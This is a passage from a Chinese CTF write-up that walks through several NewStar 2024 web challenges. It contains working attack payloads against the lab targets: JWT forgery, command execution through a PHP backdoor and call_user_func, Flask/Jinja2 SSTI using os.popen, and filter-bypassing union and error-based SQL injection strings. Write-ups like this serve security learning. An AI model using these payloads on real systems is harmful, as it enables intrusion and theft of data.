+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">url</span><span class="o">=</span> <span class="s1">&#39;http://192.168.1.117:61122/?ask=miao&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">html</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="s1">&#39;PATCH&#39;</span><span class="p">,</span> <span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;say&#34;</span><span class="p">:</span><span class="s2">&#34;玛卡巴卡阿卡哇卡米卡玛卡呣&#34;</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">cookies</span><span class="o">=</span> <span class="p">{</span><span class="s2">&#34;token&#34;</span><span class="p">:</span><span class="s2">&#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6NX0.PTZOvQ7-WBrk_do-Z8kZIArxWK-q1EG2FpH1egSioAI&#34;</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">headers</span><span class="o">=</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">                            <span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Papa/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36&#34;</span>
+</span></span><span class="line"><span class="cl">                        <span class="p">},</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">files</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;file&#34;</span><span class="p">:(</span><span class="s2">&#34;*.zip&#34;</span><span class="p">,</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;input.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">),</span> <span class="s2">&#34;application/x-zip-compressed&#34;</span><span class="p">)})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">html</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2024newstar-web/image-20250518125230822.png"
+	width="1504"
+	height="379"
+	srcset="/p/2024newstar-web/image-20250518125230822_hu_f764febed680547d.png 480w, /p/2024newstar-web/image-20250518125230822_hu_ac81cefa079951f8.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250518125230822"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="396"
+		data-flex-basis="952px"
+	
+></p>
+<p>进到下一关</p>
+<img src="image-20250518131359217.png" alt="image-20250518131359217" style="zoom:50%;" />
+<p>直接xff伪造，发包，看到jwt和一串字符立马想到jwt伪造，而后面字符就是密钥</p>
+<img src="image-20250518131206494.png" alt="image-20250518131206494" style="zoom:50%;" />
+<p>然后改为第0关的token（第七关试了试没有）</p>
+<img src="image-20250518131508680.png" alt="image-20250518131508680" style="zoom:50%;" />
+<p>然后将token复制就好了</p>
+<img src="image-20250518131711381.png" alt="image-20250518131711381" style="zoom:33%;" />
+<p>得到flag</p>
+<img src="image-20250518131725204.png" alt="image-20250518131725204" style="zoom:50%;" />
+<h2 id="headach3"><strong>headach3</strong>
+</h2><p>简单，查看请求头就行</p>
+<p><img src="/p/2024newstar-web/image-20250518142524144.png"
+	width="1666"
+	height="456"
+	srcset="/p/2024newstar-web/image-20250518142524144_hu_764449f0af250a9b.png 480w, /p/2024newstar-web/image-20250518142524144_hu_29bc27fa2730cdfe.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250518142524144"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="365"
+		data-flex-basis="876px"
+	
+></p>
+<h2 id="会赢吗">会赢吗
+</h2><p>查看源码得到一部分flag（解码是flag{WA0w）和下一关路由/4cqu1siti0n</p>
+<img src="image-20250518142816207.png" alt="image-20250518142816207" style="zoom:50%;" />
+<p>看第二关，查看源码</p>
+<img src="image-20250518143730483.png" alt="image-20250518143730483" style="zoom:50%;" />
+<p>显然，我们要调用revealFlag(&rsquo;$ClassName&rsquo;);当传入正确的ClassName就有flag，根据提示ClassName显然是4cqu1siti0n,得到部分flag（!_y4_r3al）与下关路由/s34l</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">revealFlag(&#39;4cqu1siti0n&#39;);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2024newstar-web/image-20250518143705389.png"
+	width="487"
+	height="161"
+	srcset="/p/2024newstar-web/image-20250518143705389_hu_f8ceb6d34fe54ca4.png 480w, /p/2024newstar-web/image-20250518143705389_hu_614007164e3c06d.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250518143705389"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="302"
+		data-flex-basis="725px"
+	
+></p>
+<p>看看下一关，源码告诉我们<code>&lt;span id=&quot;state&quot;&gt;</code>内容必须为**&ldquo;解封&rdquo;**</p>
+<img src="image-20250518145115351.png" alt="image-20250518145115351" style="zoom:50%;" />
+<p>直接控制台输命令就行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">document.getElementById(&#39;state&#39;).textContent = &#39;解封&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20250518145044082.png" alt="image-20250518145044082" style="zoom:50%;" />
+<p>得到部分flag(1y_Gr4sP)和下一关路由/Ap3x</p>
+<p>这关点会赢的跳出alert，获取Flag需要绕过前端JavaScript限制，直接禁用js（下载一个插件javascript-switch就行）接下来随意点击一个按钮即可</p>
+<img src="image-20250518150210204.png" alt="image-20250518150210204" style="zoom:50%;" />
+<img src="image-20250518150459982.png" alt="image-20250518150459982" style="zoom:50%;" />
+<p>最后一个乱码，所以将得到的base64字符一起拼接</p>
+<img src="image-20250518151751331.png" alt="image-20250518151751331" style="zoom:33%;" />
+<h2 id="智械危机"><strong>智械危机</strong>
+</h2><p>提示robots,查看robots.txt，得到/backd0or.php，访问有</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">execute_cmd</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">system</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">decrypt_request</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">,</span> <span class="nv">$key</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$decoded_key</span> <span class="o">=</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$key</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$reversed_cmd</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$reversed_cmd</span> <span class="o">.=</span> <span class="nv">$cmd</span><span class="p">[</span><span class="nv">$i</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$hashed_reversed_cmd</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$reversed_cmd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$hashed_reversed_cmd</span> <span class="o">!==</span> <span class="nv">$decoded_key</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Invalid key&#34;</span><span class="p">);</span>	<span class="c1">#base64解码后的key要=逆序后md5加密的cmd
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$decrypted_cmd</span> <span class="o">=</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$decrypted_cmd</span><span class="p">;</span><span class="c1">#base64解码cmd
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;key&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">execute_cmd</span><span class="p">(</span><span class="nx">decrypt_request</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">],</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;key&#39;</span><span class="p">]));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>由上面代码知cmd传入的是命令的base64编码,其经过逆序与md5加密后等于key的base64解码</p>
+<p>那么要执行system(&rsquo;ls /&rsquo;),传入ls /的base64编码，逆序，MD5加密后的字符是e94d3f9d270f5734c0e60467d44e7d46</p>
+<img src="image-20250518153036322.png" alt="image-20250518153036322" style="zoom:50%;" />
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">所以key就是传e94d3f9d270f5734c0e60467d44e7d46的base64编码ZTk0ZDNmOWQyNzBmNTczNGMwZTYwNDY3ZDQ0ZTdkNDY=
+</span></span><span class="line"><span class="cl">cmd就是传ls /的base64编码bHMgLw==
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20250518153344147.png" alt="image-20250518153344147" style="zoom:50%;" />
+<p>接下来如法炮制即可，命令改为cat /flag</p>
+<img src="image-20250518153520671.png" alt="image-20250518153520671" style="zoom:50%;" />
+<h2 id="谢谢皮蛋"><strong>谢谢皮蛋</strong>
+</h2><p>简单测试一下发现是数字型sql注入</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">id=1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>查列</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">id=1 order by 2
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现1，2都有回显</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">id=-1 union select 1,2
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>测有哪些数据库(information_schema,performance_schema,mysql,ctf)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">id=-1 union select 1,group_concat(schema_name)from information_schema.schemata
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>测一下当前数据库是哪个（是ctf，如果不是下面的语句就要指定数据库，不能直接用database()）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">id=-1 union select 1,database()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>查表（Fl4g,hexo）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">id=-1 union select 1,group_concat(table_name)from information_schema.tables where table_schema=database()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>查有哪些字段（id,des,value）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">id=-1 union select 1,group_concat(column_name)from information_schema.columns where table_name=&#34;Fl4g&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>查字段内容（id,des,value）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="nf">group_concat</span><span class="p">(</span><span class="n">id</span><span class="p">,</span><span class="n">des</span><span class="p">,</span><span class="n">value</span><span class="p">)</span><span class="k">from</span><span class="w"> </span><span class="o">`</span><span class="n">Fl4g</span><span class="o">`</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="week2">week2
+</h1><h2 id="pangbai-过家家2"><strong>PangBai 过家家（2）</strong>
+</h2><p>题目一上来说找泄露文件，直接dirsearch扫，一眼git泄露</p>
+<img src="image-20250518160100125.png" alt="image-20250518160100125" style="zoom:50%;" />
+<p>然后并没有发现什么有用的东西，但是看了下面第二篇文章，成功发现后门源码</p>
+<p><a class="link" href="https://piiick.github.io/2024/10/27/GitHacker%e5%b7%a5%e5%85%b7%e5%ae%89%e8%a3%85%e4%b8%8e%e4%bd%bf%e7%94%a8/"  target="_blank" rel="noopener"
+    >GitHacker工具 - piiick的博客</a></p>
+<p><a class="link" href="https://www.cnblogs.com/adsry/articles/12426109.html"  target="_blank" rel="noopener"
+    >githacker的使用 - adsry - 博客园</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">git stash apply
+</span></span><span class="line"><span class="cl">git add BacKd0or.vubjeVv3GZwDWHK3.php
+</span></span><span class="line"><span class="cl">#git stash pop也可以恢复   --此命令从 Stash 中释放内容，默认为恢复最新的内容到工作区。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2024newstar-web/image-20250518163105934.png"
+	width="1366"
+	height="325"
+	srcset="/p/2024newstar-web/image-20250518163105934_hu_8c3000d36640fc63.png 480w, /p/2024newstar-web/image-20250518163105934_hu_9ccc95b47313f628.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250518163105934"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="420"
+		data-flex-basis="1008px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Functions to handle HTML output
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">print_msg</span><span class="p">(</span><span class="nv">$msg</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$content</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$content</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/\s*&lt;script.*&lt;\/script&gt;/s&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$content</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$content</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/ event/&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$content</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$content</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;点击此处载入存档&#39;</span><span class="p">,</span> <span class="nv">$msg</span><span class="p">,</span> <span class="nv">$content</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nv">$content</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">show_backdoor</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$content</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$content</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;/assets/index.4f73d116116831ef.js&#39;</span><span class="p">,</span> <span class="s1">&#39;/assets/backdoor.5b55c904b31db48d.js&#39;</span><span class="p">,</span> <span class="nv">$content</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nv">$content</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Backdoor
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;papa&#39;</span><span class="p">]</span> <span class="o">!==</span> <span class="s1">&#39;doKcdnEOANVB&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">show_backdoor</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;NewStar_CTF.2024&#39;</span><span class="p">]</span> <span class="o">!==</span> <span class="s1">&#39;Welcome&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^Welcome$/&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;NewStar_CTF.2024&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">print_msg</span><span class="p">(</span><span class="s1">&#39;PangBai loves you!&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">call_user_func</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;func&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;args&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">print_msg</span><span class="p">(</span><span class="s1">&#39;PangBai hates you!&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个简单</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">post传：papa=doKcdnEOANVB&amp;func=system&amp;args=env
+</span></span><span class="line"><span class="cl">get传：NewStar[CTF.2024=Welcome%0a
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>查看源码得</p>
+<img src="image-20250518165421956.png" alt="image-20250518165421956" style="zoom:50%;" />
+<h2 id="你能在一秒内打出八句英文吗"><strong>你能在一秒内打出八句英文吗</strong>
+</h2><h2 id="复读机"><strong>复读机</strong>
+</h2><p>一看flask框架，立马想到ssti，一测果然是，直接打，没过滤</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{lipsum.__globals__.os.popen(&#39;ls /&#39;).read()}}
+</span></span><span class="line"><span class="cl">{{lipsum.__globals__.os.popen(&#39;cat /flag&#39;).read()}}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="谢谢皮蛋-plus"><strong>谢谢皮蛋 plus</strong>
+</h2><h3 id="过滤空格的报错注入联合注入">过滤空格的报错注入(联合注入)
+</h3><p>测试了一下双引号闭合</p>
+<p>一开始打的<strong>报错注入</strong>，发现过滤了extractvalue，空格（/**/代替），and被过滤（or代替），而且只能用#不可以用&ndash;+</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#34;/**/or/**/updatexml(1,concat(&#39;~&#39;,(select/**/database())),1)#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#34;/**/or/**/updatexml(1,concat(&#39;~&#39;,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())),1)#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#34;/**/or/**/updatexml(1,concat(&#39;~&#39;,(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&#34;Fl4g&#34;)),1)#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="mi">1</span><span class="s2">&#34;/**/or/**/updatexml(1,concat(&#39;~&#39;,(select/**/group_concat(id,des,value)/**/from/**/`Fl4g`)),1)#
+</span></span></span><span class="line"><span class="cl"><span class="s2">（显示的字符补全，那我们就分别查询，如下图先查1-10，再查11-20，以此直到查到flag）
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="mi">1</span><span class="s2">&#34;/**/or/**/updatexml(1,concat(&#39;~&#39;,mid((select/**/group_concat(id,des,value)/**/from/**/`Fl4g`),1,10)),1)#
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>wp说报错注入被ban（其实不然，上面就打了），wp打的<strong>联合注入</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#34;/**/order/**/by/**/2#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-1&#34;/**/union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-1&#34;/**/union/**/select/**/1,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&#34;Fl4g&#34;#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
